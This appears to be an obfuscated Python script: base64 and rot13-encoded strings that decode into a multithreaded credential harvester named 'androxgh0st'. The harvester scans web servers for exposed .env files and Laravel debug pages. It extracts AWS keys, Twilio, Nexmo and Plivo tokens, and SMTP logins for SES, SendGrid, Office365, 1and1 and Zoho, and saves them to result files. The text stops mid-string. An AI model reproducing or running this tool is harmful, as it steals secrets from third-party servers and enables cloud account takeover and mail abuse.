import base64, codecs
magic = 'IyAtKi0gY29kaW5nOiB1dGYtOCAtKi0KaW1wb3J0IHJlcXVlc3RzLCBvcywgc3lzLGNvbG9yYW1hCmNvbG9yYW1hLmluaXQoYXV0b3Jlc2V0PVRydWUpCmZyb20gcmUgaW1wb3J0IGZpbmRhbGwgYXMgcmVnCnJlcXVlc3RzLnBhY2thZ2VzLnVybGxpYjMuZGlzYWJsZV93YXJuaW5ncygpCmZyb20gdGhyZWFkaW5nIGltcG9ydCAqCmZyb20gdGhyZWFkaW5nIGltcG9ydCBUaHJlYWQKZnJvbSBjb25maWdwYXJzZXIgaW1wb3J0IENvbmZpZ1BhcnNlcgpmcm9tIHF1ZXVlIGltcG9ydCBRdWV1ZQoKdHJ5OgoJb3MubWtkaXIoJ1Jlc3VsdHMnKQpleGNlcHQ6CglwYXNzCgpsaXN0X3JlZ2lvbiA9ICcnJ3VzLWVhc3QtMQp1cy1lYXN0LTIKdXMtd2VzdC0xCnVzLXdlc3QtMgphZi1zb3V0aC0xCmFwLWVhc3QtMQphcC1zb3V0aC0xCmFwLW5vcnRoZWFzdC0xCmFwLW5vcnRoZWFzdC0yCmFwLW5vcnRoZWFzdC0zCmFwLXNvdXRoZWFzdC0xCmFwLXNvdXRoZWFzdC0yCmNhLWNlbnRyYWwtMQpldS1jZW50cmFsLTEKZXUtd2VzdC0xCmV1LXdlc3QtMgpldS13ZXN0LTMKZXUtc291dGgtMQpldS1ub3J0aC0xCm1lLXNvdXRoLTEKc2EtZWFzdC0xJycnCnBpZF9yZXN0b3JlID0gJy5uZXJvX3N3YWxsb3d0YWlsJwoKY2xhc3MgV29ya2VyKFRocmVhZCk6CglkZWYgX19pbml0X18oc2VsZiwgdGFza3MpOgoJCVRocmVhZC5fX2luaXRfXyhzZWxmKQoJCXNlbGYudGFza3MgPSB0YXNrcwoJCXNlbGYuZGFlbW9uID0gVHJ1ZQoJCXNlbGYuc3RhcnQoKQoKCWRlZiBydW4oc2VsZik6CgkJd2hpbGUgVHJ1ZToKCQkJZnVuYywgYXJncywga2FyZ3MgPSBzZWxmLnRhc2tzLmdldCgpCgkJCXRyeTogZnVuYygqYXJncywgKiprYXJncykKCQkJZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOiBwcmludChlKQoJCQlzZWxmLnRhc2tzLnRhc2tfZG9uZSgpCgpjbGFzcyBUaHJlYWRQb29sOgoJZGVmIF9faW5pdF9fKHNlbGYsIG51bV90aHJlYWRzKToKCQlzZWxmLnRhc2tzID0gUXVldWUobnVtX3RocmVhZHMpCgkJZm9yIF8gaW4gcmFuZ2UobnVtX3RocmVhZHMpOiBXb3JrZXIoc2VsZi50YXNrcykKCglkZWYgYWRkX3Rhc2soc2VsZiwgZnVuYywgKmFyZ3MsICoqa2FyZ3MpOgoJCXNlbGYudGFza3MucHV0KChmdW5jLCBhcmdzLCBrYXJncykpCgoJZGVmIHdhaXRfY29tcGxldGlvbihzZWxmKToKCQlzZWxmLnRhc2tzLmpvaW4oKQoKY2xhc3MgYW5kcm94Z2gwc3Q6CglkZWYgbmV4bW8oc2VsZiwgdGV4dCwgdXJsKToKCQlpZiAiTkVYTU9fS0VZIiBpbiB0ZXh0OgoJCQlzYXZlID0gb3BlbignUmVzdWx0cy9uZXhtby50eHQnLCdhJykKCQkJc2F2ZS53cml0ZSh1cmwrJ1wKJykKCQkJc2F2ZS5jbG9zZSgpCgkJCXJldHVybiBUcnVlCgkJZWxzZToKCQkJcmV0dXJuIEZhbHNlCgkJCQoJZGVmIHBsaXZvKHNlbGYsIHRleHQsIHVybCk6CgkJaWYgIlBMSVZPX0FVVEhfSUQiIGluIHRleHQ6CgkJCXNhdmUgPSBvcGVuKCdSZXN1bHRzL3BsaXZvLnR4dCcsJ2EnKQoJCQlzYXZlLndyaXRlKHVybCsnXAonKQoJCQlzYXZlLmNsb3NlKCkKCQkJcmV0dXJuIFRydWUKCQllbHNlOgoJCQlyZXR1cm4gRmFsc2UJCQoKCWRlZiBnZXRfYXdzX3JlZ2lvbihzZWxmLCB0ZXh0KToKCQlyZWcgPSBGYWxzZQoJCWZvciByZWdpb24gaW4gbGlzdF9yZWdpb24uc3BsaXRsaW5lcygpOgoJCQlpZiBzdHIocmVnaW9uKSBpbiB0ZXh0OgoJCQkJcmV0dXJuIHJlZ2lvbgoJCQkJYnJlYWsKCgoJZGVmIGdldF9hd3NfZGF0YShzZWxmLCB0ZXh0LCB1cmwpOgoJCXRyeToKCQkJaWYgIkFXU19BQ0NFU1NfS0VZX0lEIiBpbiB0ZXh0OgoJCQkJaWYgIkFXU19BQ0NFU1NfS0VZX0lEPSIgaW4gdGV4dDoKCQkJCQltZXRob2QgPSAnLy5lbnYnCgkJCQkJdHJ5OgoJCQkJCQlhd3Nfa2V5ID0gcmVnKCJcCkFXU19BQ0NFU1NfS0VZX0lEPSguKj8pXAoiLCB0ZXh0KVswXQoJCQkJCWV4Y2VwdDoKCQkJCQkJYXdzX2tleSA9ICcnCgkJCQkJdHJ5OgoJCQkJCQlhd3Nfc2VjID0gcmVnKCJcCkFXU19TRUNSRVRfQUNDRVNTX0tFWT0oLio/KVwKIiwgdGV4dClbMF0KCQkJCQlleGNlcHQ6CgkJCQkJCWF3c19zZWMgPSAnJwoJCQkJCXRyeToKCQkJCQkJYXN1ID0gYW5kcm94Z2gwc3QoKS5nZXRfYXdzX3JlZ2lvbih0ZXh0KQoJCQkJCQlpZiBhc3U6CgkJCQkJCQlhd3NfcmVnID0gYXN1CgkJCQkJCWVsc2U6CgkJCQkJCQlhd3NfcmVnID0gJycKCQkJCQlleGNlcHQ6CgkJCQkJCWF3c19yZWcgPSAnJwoJCQkJZWxpZiAiPHRkPkFXU19BQ0NFU1NfS0VZX0lEPC90ZD4iIGluIHRleHQ6CgkJCQkJbWV0aG9kID0gJ2RlYnVnJwoJCQkJCXRyeToKCQkJCQkJYXdzX2tleSA9IHJlZygiPHRkPkFXU19BQ0NFU1NfS0VZX0lEPFxcL3RkPlxccys8dGQ+PHByZS4qPiguKj8pPFxcL3NwYW4+IiwgdGV4dClbMF0KCQkJCQlleGNlcHQ6CgkJCQkJCWF3c19rZXkgPSAnJwoJCQkJCXRyeToKCQkJCQkJYXdzX3NlYyA9IHJlZygiPHRkPkFXU19TRUNSRVRfQUNDRVNTX0tFWTxcXC90ZD5cXHMrPHRkPjxwcmUuKj4oLio/KTxcXC9zcGFuPiIsIHRleHQpWzBdCgkJCQkJZXhjZXB0OgoJCQkJCQlhd3Nfc2VjID0gJycKCQkJCQl0cnk6CgkJCQkJCWFzdSA9IGFuZHJveGdoMHN0KCkuZ2V0X2F3c19yZWdpb24odGV4dCkKCQkJCQkJaWYgYXN1OgoJCQkJCQkJYXdzX3JlZyA9IGFzdQoJCQkJCQllbHNlOgoJCQkJCQkJYXdzX3JlZyA9ICcnCgkJCQkJZXhjZXB0OgoJCQkJCQlhd3NfcmVnID0gJycKCQkJCWlmIGF3c19yZWcgPT0gIiI6CgkJCQkJYXdzX3JlZyA9ICJhd3NfdW5rbm93bl9yZWdpb24tLSIKCQkJCWlmIGF3c19rZXkgPT0gIiIgYW5kIGF3c19zZWMgPT0gIiI6CgkJCQkJcmV0dXJuIEZhbHNlCgkJCQllbHNlOgoJCQkJCWJ1aWxkID0gJycKCQkJCQkrc3RyKHVybCkrJycKCQkJCQkrc3RyKG1ldGhvZCkrJycrc3RyKGF3c19rZXkpKyd8JytzdHIoYXdzX3NlYykrJ3wnK3N0cihhd3NfcmVnKSsnJwoJCQkJCXJlbW92ZXIgPSBzdHIoYnVpbGQpLnJlcGxhY2UoJ1wnJywgJycpCgkJCQkJc2F2ZSA9IG9wZW4oJ1Jlc3VsdHMvJytzdHIoYXdzX3JlZylbOi0yXSsnLnR4dCcsICdhJykKCQkJCQlzYXZlLndyaXRlKHJlbW92ZXIrJ1wKXAonKQoJCQkJCXNhdmUuY2xvc2UoKQoJCQkJCXJlbW92ZXIgPSBzdHIoYnVpbGQpLnJlcGxhY2UoJ1wnJywgJycpCgkJCQkJc2F2ZTIgPSBvcGVuKCdSZXN1bHRzL2F3c19hY2Nlc3Nfa2V5X3NlY3JldC50eHQnLCAnYScpCgkJCQkJc2F2ZTIud3JpdGUocmVtb3ZlcisnXApcCicpCgkJCQkJc2F2ZTIuY2xvc2UoKQoJCQkJcmV0dXJuIFRydWUKCQkJZWxpZiAiQVdTX0tFWSIgaW4gdGV4dDoKCQkJCWlmICJBV1NfS0VZPSIgaW4gdGV4dDoKCQkJCQltZXRob2QgPSAnLy5lbnYnCgkJCQkJdHJ5OgoJCQkJCQlhd3Nfa2V5ID0gcmVnKCJcCkFXU19LRVk9KC4qPylcCiIsIHRleHQpWzBdCgkJCQkJZXhjZXB0OgoJCQkJCQlhd3Nfa2V5ID0gJycKCQkJCQl0cnk6CgkJCQkJCWF3c19zZWMgPSByZWcoIlwKQVdTX1NFQ1JFVD0oLio/KVwKIiwgdGV4dClbMF0KCQkJCQlleGNlcHQ6CgkJCQkJCWF3c19zZWMgPSAnJwoJCQkJCXRyeToKCQkJCQkJYXN1ID0gYW5kcm94Z2gwc3QoKS5nZXRfYXdzX3JlZ2lvbih0ZXh0KQoJCQkJCQlpZiBhc3U6CgkJCQkJCQlhd3NfcmVnID0gYXN1CgkJCQkJCWVsc2U6CgkJCQkJCQlhd3NfcmVnID0gJycKCQkJCQlleGNlcHQ6CgkJCQkJCWF3c19yZWcgPSAnJwoJCQkJCXRyeToKCQkJCQkJYXdzX2J1YyA9IHJlZygiXApBV1NfQlVDS0VUPSguKj8pXAoiLCB0ZXh0KVswXQoJCQkJCWV4Y2VwdDoKCQkJCQkJYXdzX2J1YyA9ICcnCgkJCQllbGlmICI8dGQ+QVdTX0tFWTwvdGQ+IiBpbiB0ZXh0OgoJCQkJCW1ldGhvZCA9ICdkZWJ1ZycKCQkJCQl0cnk6CgkJCQkJCWF3c19rZXkgPSByZWcoIjx0ZD5BV1NfS0VZPFxcL3RkPlxccys8dGQ+PHByZS4qPiguKj8pPFxcL3NwYW4+IiwgdGV4dClbMF0KCQkJCQlleGNlcHQ6CgkJCQkJCWF3c19rZXkgPSAnJwoJCQkJCXRyeToKCQkJCQkJYXdzX3NlYyA9IHJlZygiPHRkPkFXU19TRUNSRVQ8XFwvdGQ+XFxzKzx0ZD48cHJlLio+KC4qPyk8XFwvc3Bhbj4iLCB0ZXh0KVswXQoJCQkJCWV4Y2VwdDoKCQkJCQkJYXdzX3NlYyA9ICcnCgkJCQkJdHJ5OgoJCQkJCQlhc3UgPSBhbmRyb3hnaDBzdCgpLmdldF9hd3NfcmVnaW9uKHRleHQpCgkJCQkJCWlmIGFzdToKCQkJCQkJCWF3c19yZWcgPSBhc3UKCQkJCQkJZWx'
love = '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'
god = 'V4dClbMF0KCQkJCQltYWlsdXNlciA9IHJlZygiXApNQUlMX1VTRVJOQU1FPSguKj8pXAoiLCB0ZXh0KVswXQoJCQkJCW1haWxwYXNzID0gcmVnKCJcCk1BSUxfUEFTU1dPUkQ9KC4qPylcCiIsIHRleHQpWzBdCgkJCQkJdHJ5OgoJCQkJCQltYWlsZnJvbSA9IHJlZygiXApNQUlMX0ZST01fQUREUkVTUz0oLio/KVwKIiwgdGV4dClbMF0KCQkJCQlleGNlcHQ6CgkJCQkJCW1haWxmcm9tID0gJycKCQkJCQl0cnk6CgkJCQkJCWZyb21uYW1lID0gcmVnKCJcXE1BSUxfRlJPTV9OQU1FPSguKj8pXAoiLCB0ZXh0KVswXQoJCQkJCWV4Y2VwdDoKCQkJCQkJZnJvbW5hbWUgPSAnJwoJCQkJZWxpZiAiPHRkPk1BSUxfSE9TVDwvdGQ+IiBpbiB0ZXh0OgoJCQkJCW1ldGhvZCA9ICdkZWJ1ZycKCQkJCQltYWlsaG9zdCA9IHJlZygnPHRkPk1BSUxfSE9TVDxcXC90ZD5cXHMrPHRkPjxwcmUuKj4oLio/KTxcXC9zcGFuPicsIHRleHQpWzBdCgkJCQkJbWFpbHBvcnQgPSByZWcoJzx0ZD5NQUlMX1BPUlQ8XFwvdGQ+XFxzKzx0ZD48cHJlLio+KC4qPyk8XFwvc3Bhbj4nLCB0ZXh0KVswXQoJCQkJCW1haWx1c2VyID0gcmVnKCc8dGQ+TUFJTF9VU0VSTkFNRTxcXC90ZD5cXHMrPHRkPjxwcmUuKj4oLio/KTxcXC9zcGFuPicsIHRleHQpWzBdCgkJCQkJbWFpbHBhc3MgPSByZWcoJzx0ZD5NQUlMX1BBU1NXT1JEPFxcL3RkPlxccys8dGQ+PHByZS4qPiguKj8pPFxcL3NwYW4+JywgdGV4dClbMF0KCQkJCQl0cnk6CgkJCQkJCW1haWxmcm9tID0gcmVnKCI8dGQ+TUFJTF9GUk9NX0FERFJFU1M8XFwvdGQ+XFxzKzx0ZD48cHJlLio+KC4qPyk8XFwvc3Bhbj4iLCB0ZXh0KVswXQoJCQkJCWV4Y2VwdDoKCQkJCQkJbWFpbGZyb20gPSAnJwoJCQkJCXRyeToKCQkJCQkJZnJvbW5hbWUgPSByZWcoIjx0ZD5NQUlMX0ZST01fTkFNRTxcXC90ZD5cXHMrPHRkPjxwcmUuKj4oLio/KTxcXC9zcGFuPiIsIHRleHQpWzBdCgkJCQkJZXhjZXB0OgoJCQkJCQlmcm9tbmFtZSA9ICcnCgkJCQlpZiBtYWlsdXNlciA9PSAibnVsbCIgb3IgbWFpbHBhc3MgPT0gIm51bGwiIG9yIG1haWx1c2VyID09ICIiIG9yIG1haWxwYXNzID09ICIiOgoJCQkJCXJldHVybiBGYWxzZQoJCQkJZWxzZToKCQkJCQkjIG1vZCBhd3MKCQkJCQlpZiAnLmFtYXpvbmF3cy5jb20nIGluIG1haWxob3N0OgoJCQkJCQlnZXRjb3VudHJ5ID0gcmVnKCdlbWFpbC1zbXRwLiguKj8pLmFtYXpvbmF3cy5jb20nLCBtYWlsaG9zdClbMF0KCQkJCQkJYnVpbGQgPSAnVVJMOiAnK3N0cih1cmwpKydcCk1FVEhPRDogJytzdHIobWV0aG9kKSsnXApNQUlMSE9TVDogJytzdHIobWFpbGhvc3QpKydcCk1BSUxQT1JUOiAnK3N0cihtYWlscG9ydCkrJ1wKTUFJTFVTRVI6ICcrc3RyKG1haWx1c2VyKSsnXApNQUlMUEFTUzogJytzdHIobWFpbHBhc3MpKydcCk1BSUxGUk9NOiAnK3N0cihtYWlsZnJvbSkrJ1wKRlJPTU5BTUU6ICcrc3RyKGZyb21uYW1lKQoJCQkJCQlyZW1vdmVyID0gc3RyKGJ1aWxkKS5yZXBsYWNlKCdcJycsICcnKQoJCQkJCQlzYXZlID0gb3BlbignUmVzdWx0cy8nK2dldGNvdW50cnlbOi0yXSsnLnR4dCcsICdhJykKCQkJCQkJc2F2ZS53cml0ZShyZW1vdmVyKydcClwKJykKCQkJCQkJc2F2ZS5jbG9zZSgpCgkJCQkJCXJlbW92ZXIgPSBzdHIoYnVpbGQpLnJlcGxhY2UoJ1wnJywgJycpCgkJCQkJCXNhdmUyID0gb3BlbignUmVzdWx0cy9zbXRwX2F3cy50eHQnLCAnYScpCgkJCQkJCXNhdmUyLndyaXRlKHJlbW92ZXIrJ1wKXAonKQoJCQkJCQlzYXZlMi5jbG9zZSgpCgkJCQkJZWxpZiAnc2VuZGdyaWQnIGluIG1haWxob3N0OgoJCQkJCQlidWlsZCA9ICdVUkw6ICcrc3RyKHVybCkrJ1wKTUVUSE9EOiAnK3N0cihtZXRob2QpKydcCk1BSUxIT1NUOiAnK3N0cihtYWlsaG9zdCkrJ1wKTUFJTFBPUlQ6ICcrc3RyKG1haWxwb3J0KSsnXApNQUlMVVNFUjogJytzdHIobWFpbHVzZXIpKydcCk1BSUxQQVNTOiAnK3N0cihtYWlscGFzcykrJ1wKTUFJTEZST006ICcrc3RyKG1haWxmcm9tKSsnXApGUk9NTkFNRTogJytzdHIoZnJvbW5hbWUpCgkJCQkJCXJlbW92ZXIgPSBzdHIoYnVpbGQpLnJlcGxhY2UoJ1wnJywgJycpCgkJCQkJCXNhdmUgPSBvcGVuKCdSZXN1bHRzL3NlbmRncmlkLnR4dCcsICdhJykKCQkJCQkJc2F2ZS53cml0ZShyZW1vdmVyKydcClwKJykKCQkJCQkJc2F2ZS5jbG9zZSgpCgkJCQkJZWxpZiAnb2ZmaWNlMzY1JyBpbiBtYWlsaG9zdDoKCQkJCQkJYnVpbGQgPSAnVVJMOiAnK3N0cih1cmwpKydcCk1FVEhPRDogJytzdHIobWV0aG9kKSsnXApNQUlMSE9TVDogJytzdHIobWFpbGhvc3QpKydcCk1BSUxQT1JUOiAnK3N0cihtYWlscG9ydCkrJ1wKTUFJTFVTRVI6ICcrc3RyKG1haWx1c2VyKSsnXApNQUlMUEFTUzogJytzdHIobWFpbHBhc3MpKydcCk1BSUxGUk9NOiAnK3N0cihtYWlsZnJvbSkrJ1wKRlJPTU5BTUU6ICcrc3RyKGZyb21uYW1lKQoJCQkJCQlyZW1vdmVyID0gc3RyKGJ1aWxkKS5yZXBsYWNlKCdcJycsICcnKQoJCQkJCQlzYXZlID0gb3BlbignUmVzdWx0cy9vZmZpY2UudHh0JywgJ2EnKQoJCQkJCQlzYXZlLndyaXRlKHJlbW92ZXIrJ1wKXAonKQoJCQkJCQlzYXZlLmNsb3NlKCkKCQkJCQllbGlmICcxYW5kMScgaW4gbWFpbGhvc3Qgb3IgJzF1bmQxJyBpbiBtYWlsaG9zdDoKCQkJCQkJYnVpbGQgPSAnVVJMOiAnK3N0cih1cmwpKydcCk1FVEhPRDogJytzdHIobWV0aG9kKSsnXApNQUlMSE9TVDogJytzdHIobWFpbGhvc3QpKydcCk1BSUxQT1JUOiAnK3N0cihtYWlscG9ydCkrJ1wKTUFJTFVTRVI6ICcrc3RyKG1haWx1c2VyKSsnXApNQUlMUEFTUzogJytzdHIobWFpbHBhc3MpKydcCk1BSUxGUk9NOiAnK3N0cihtYWlsZnJvbSkrJ1wKRlJPTU5BTUU6ICcrc3RyKGZyb21uYW1lKQoJCQkJCQlyZW1vdmVyID0gc3RyKGJ1aWxkKS5yZXBsYWNlKCdcJycsICcnKQoJCQkJCQlzYXZlID0gb3BlbignUmVzdWx0cy8xYW5kMS50eHQnLCAnYScpCgkJCQkJCXNhdmUud3JpdGUocmVtb3ZlcisnXApcCicpCgkJCQkJCXNhdmUuY2xvc2UoKQoJCQkJCWVsaWYgJ3pvaG8nIGluIG1haWxob3N0OgoJCQkJCQlidWlsZCA9ICdVUkw6ICcrc3RyKHVybCkrJ1wKTUVUSE9EOiAnK3N0cihtZXRob2QpKydcCk1BSUxIT1NUOiAnK3N0cihtYWlsaG9zdCkrJ1wKTUFJTFBPUlQ6ICcrc3RyKG1haWxwb3J0KSsnXApNQUlMVVNFUjogJytzdHIobWFpbHVzZXIpKydcCk1BSUxQQVNTOiAnK3N0cihtYWlscGFzcykrJ1wKTUFJTEZST006ICcrc3RyKG1haWxmcm9tKSsnXApGUk9NTkFNRTogJytzdHIoZn